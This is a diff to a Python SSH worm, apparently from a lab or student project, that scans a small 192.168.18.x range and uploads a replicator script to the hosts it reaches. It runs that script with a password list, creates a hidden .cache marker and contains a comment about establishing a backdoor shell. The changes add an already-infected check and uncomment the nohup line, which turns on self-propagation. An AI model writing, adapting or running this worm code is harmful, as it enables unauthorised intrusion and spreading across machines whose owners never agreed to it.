@@ -9,6 +9,18 @@ import time
 import logging
 import getpass 
 
+# Check if payload exists before doing anything
+
+uname = getpass.getuser()
+print(uname)
+
+try:
+	f = open("/home/" + str(uname) + "/.cache/gotcha")
+	f.close()
+	print("payload already exists, exiting program.")
+	sys.exit()
+except IOError:
+	print("Executing script...")
 ##################################################################
 # Function that will ping all IP addresses within the given range and
 # store all IP addresses that responded
@@ -20,7 +32,7 @@ def get_list_of_hosts():
 	FNULL = open(os.devnull, 'w')
 	print("Localhost IP = " + my_IP_address)
 
-	#Loop trough 10 different IP's and check if any one of them respons. 
+	#Loop trough 10 different IP's and check if any one of them respond. 
 	for ping in range(20,27): 
 		address = "192.168.18." + str(ping) 
 
@@ -146,8 +158,8 @@ def UploadFileAndExecute(sshConnection) :
 	stdin, stdout, stderr = sshConnection.exec_command("chmod a+x /tmp/worm/" +"replicator.py")  
 	stdout.channel.recv_exit_status()   
 
-	#stdin, stdout, stderr = sshConnection.exec_command("nohup python /tmp/worm/" +"replicator.py passwords.txt"+ " &")  
-	#stdout.channel.recv_exit_status()   
+	stdin, stdout, stderr = sshConnection.exec_command("nohup python /tmp/worm/" +"replicator.py passwords.txt"+ " &")  
+	stdout.channel.recv_exit_status()   
 	
 	# Establishing Backdoor Shell Connection
 	sshConnection.exec_command("mkdir /home/" + str(username) + "/.cache")
